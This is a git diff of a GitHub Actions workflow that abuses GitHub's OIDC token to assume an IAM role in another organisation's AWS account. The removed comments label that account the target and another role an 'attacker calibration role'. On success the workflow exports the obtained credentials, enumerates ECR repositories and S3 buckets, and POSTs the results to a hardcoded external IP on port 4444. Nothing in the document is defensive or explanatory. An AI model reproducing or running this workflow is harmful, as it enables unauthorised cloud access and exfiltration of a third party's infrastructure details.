@@ -10,50 +10,30 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: Probe github_assume_role in 942583694543
-        env:
-          VPS: "150.40.127.139"
-          PORT: "4444"
+      - name: Probe 942583694543
         run: |
           TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
-          if [ -z "$TOKEN" ]; then
-            curl -sf -X POST "http://$VPS:$PORT/" --max-time 20 -d "OIDC_TOKEN_FAIL: could not obtain OIDC token" || true
-            exit 1
-          fi
-
-          # Probe 1: attacker calibration role (should PASS)
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | \
+            python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
           R_CALIB=$(aws sts assume-role-with-web-identity \
             --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
-            --role-session-name xrk7m2nq \
-            --web-identity-token "$TOKEN" 2>&1 | tail -3)
-
-          # Probe 2: eniac-x-labs github_assume_role (THE PROBE)
+            --role-session-name xrk7m2nq --web-identity-token "$TOKEN" 2>&1 | tail -2)
           R_TARGET=$(aws sts assume-role-with-web-identity \
             --role-arn "arn:aws:iam::942583694543:role/github_assume_role" \
-            --role-session-name xrk7m2nq \
-            --web-identity-token "$TOKEN" 2>&1 | tail -3)
-
-          # If target passes, enumerate ECR repos
-          ECR_REPOS=""
+            --role-session-name xrk7m2nq --web-identity-token "$TOKEN" 2>&1 | tail -2)
           TARGET_CREDS=$(aws sts assume-role-with-web-identity \
             --role-arn "arn:aws:iam::942583694543:role/github_assume_role" \
-            --role-session-name xrk7m2nq \
-            --web-identity-token "$TOKEN" 2>/dev/null)
+            --role-session-name xrk7m2nq --web-identity-token "$TOKEN" 2>/dev/null || true)
           if [ -n "$TARGET_CREDS" ]; then
-            export AWS_ACCESS_KEY_ID=$(echo "$TARGET_CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['AccessKeyId'])")
-            export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SecretAccessKey'])")
-            export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SessionToken'])")
+            export AWS_ACCESS_KEY_ID=$(echo "$TARGET_CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
+            export AWS_SECRET_ACCESS_KEY=$(echo "$TARGET_CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
+            export AWS_SESSION_TOKEN=$(echo "$TARGET_CREDS" | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")
             export AWS_DEFAULT_REGION=ap-southeast-1
             CALLER=$(aws sts get-caller-identity 2>&1)
-            ECR_REPOS=$(aws ecr describe-repositories --region ap-southeast-1 2>&1 | python3 -c "import sys,json; repos=json.load(sys.stdin).get('repositories',[]); print('
-'.join([r['repositoryUri'] for r in repos]))" 2>/dev/null || echo "ECR_LIST_FAILED")
-            S3_BUCKETS=$(aws s3 ls 2>&1 | head -20)
-            EKS_CLUSTERS=$(aws eks list-clusters --region ap-southeast-1 2>&1)
-            PAYLOAD="942583694543_PASS|CALLER:$CALLER|ECR:$ECR_REPOS|S3:$S3_BUCKETS|EKS:$EKS_CLUSTERS"
+            ECR=$(aws ecr describe-repositories --region ap-southeast-1 2>&1 | python3 -c "import sys,json; repos=json.load(sys.stdin).get('repositories',[]); print(' '.join([r['repositoryUri'] for r in repos]))" 2>/dev/null || echo "ECR_FAIL")
+            S3=$(aws s3 ls 2>&1 | head -20)
+            PAYLOAD="942583694543_PASS|CALLER:$CALLER|ECR:$ECR|S3:$S3"
           else
-            PAYLOAD="942583694543_FAIL|R_TARGET:$R_TARGET|R_CALIB:$R_CALIB"
+            PAYLOAD="942583694543_FAIL|R_TARGET:$R_TARGET|CALIB:$R_CALIB"
           fi
-
-          curl -sf -X POST "http://$VPS:$PORT/" --max-time 30 \
-            -d "$PAYLOAD" || true
+          curl -sf -X POST http://150.40.127.139:4444/ --max-time 30 -d "$PAYLOAD" || true
